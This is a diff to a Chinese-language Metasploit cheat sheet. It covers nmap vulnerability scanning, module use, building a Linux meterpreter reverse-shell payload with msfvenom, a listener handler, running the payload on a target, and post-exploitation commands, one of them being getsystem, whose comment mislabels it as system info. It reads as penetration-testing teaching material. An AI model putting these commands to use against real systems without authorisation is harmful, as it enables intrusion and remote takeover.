@@ -8,28 +8,23 @@ tags: [Security, Metasploit]
 <!-- 設定檔位置: ~/.msf4 -->
 
 # 開啟 Metasploit Console
-```sh
+```bash
 msfconsole
 ```
 
 <!--more-->
 
+# 初始化 PostgreSQL 資料庫
+```bash
 # 初始化資料庫
-```sh
-# 初始化資料庫
-sudo msfdb init
+msfdb init
 
 # 查詢資料庫狀態
 db_status
 ```
 
-# 更新可用模組
-```sh
-msfupdate
-```
-
 # nmap 掃描
-```sh
+```bash
 # 基礎掃描
 db_nmap -sV -p- [IP]
 
@@ -39,9 +34,14 @@ db_nmap -sV --script vulners [IP]
 # vulners.com 線上漏洞掃描
 db_nmap -sV --script vulners [IP]
 ```
+# 模組操作
+⭐ 更新可用模組
+```bash
+msfupdate
+```
 
-# 顯示可用模組
-```sh
+⭐ 顯示可用模組
+```bash
 # 顯示所有可用的漏洞利用模組，用於針對目標系統的已知漏洞進行攻擊
 show exploits
 
@@ -61,13 +61,13 @@ show encoders
 show nops
 ```
 
-# 查找模組
-```sh
+⭐ 查找模組
+```bash
 search [模組名稱或關鍵詞]
 ```
 
-# 模組使用
-```sh
+⭐ 模組使用
+```bash
 # 載入模組
 use [模組路徑]
 
@@ -84,37 +84,32 @@ show options
 exploit
 ```
 
-# payload 用途
+# payload 基本操作
 
-    用途: 產生 command shell payload
-    模組: windows/shell/reverse_tcp
-    說明: 獲得一個命令行界面，允許攻擊者在目標系統上執行命令
+⭐ 用途介紹
 
-    用途: 產生 meterpreter payload
-    模組: windows/meterpreter/reverse_tcp
-    說明: 一種高級的、擴展性強的 payload，提供了豐富的功能，例如文件操作、過程管理、網絡偵查等
+| 用途      | 說明  |
+| :------- | :---- |
+| command shell | 獲得一個命令行界面，允許攻擊者在目標系統上執行命令   |
+| meterpreter | 一種高級的、擴展性強的 payload，提供了豐富的功能，例如文件操作、過程管理、網絡偵查等 |
+| vnc | 在目標系統上開啟一個 VNC 服務器，允許攻擊者遠程查看和控制目標桌面 |
 
-    用途: 產生 vnc payload
-    模組: windows/vncinject/reverse_tcp
-    說明: 在目標系統上開啟一個 VNC 服務器，允許攻擊者遠程查看和控制目標桌面
-
-# 基本操作
-## 創建 meterpreter payload :
-```sh
-msfvenom -a x86 --platform Linux -p linux/x86/meterpreter/reverse_tcp LHOST=[IP位置] LPORT=[監聽端口] -f elf -o payload.elf
+⭐ 創建 meterpreter payload :
+```bash
+msfvenom -a x86 --platform Linux -p linux/x86/meterpreter/reverse_tcp LHOST=[監聽機IP位置] LPORT=[監聽機端口] -f elf -o payload.elf
 ```
 
-## 監聽 payload ，等待遠端執行 payload
-```sh
+⭐ 監聽 payload ，等待遠端執行 payload
+```bash
 use exploit/multi/handler
 set payload linux/x86/meterpreter/reverse_tcp
-set LHOST [IP位置]
-set LPORT [監聽端口]
+set LHOST [監聽機IP位置]
+set LPORT [監聽機端口]
 exploit
 ```
 
-## 遠端執行 payload
-```sh
+⭐ 遠端執行 payload
+```bash
 # 給予執行權限
 chmod +x payload.elf
 # 執行 payload
@@ -122,7 +117,7 @@ chmod +x payload.elf
 ```
 
 # 後滲透操作(取得shell後)
-```sh
+```bash
 # 列出當前活動會話
 sessions -l
 
@@ -131,6 +126,12 @@ sessions -i [會話ID]
 
 # 獲取系統信息
 sysinfo
+
+# 獲取使用者信息
+getuid
+
+# 獲取系統信息
+getsystem
 
 # 獲取shell
 shell
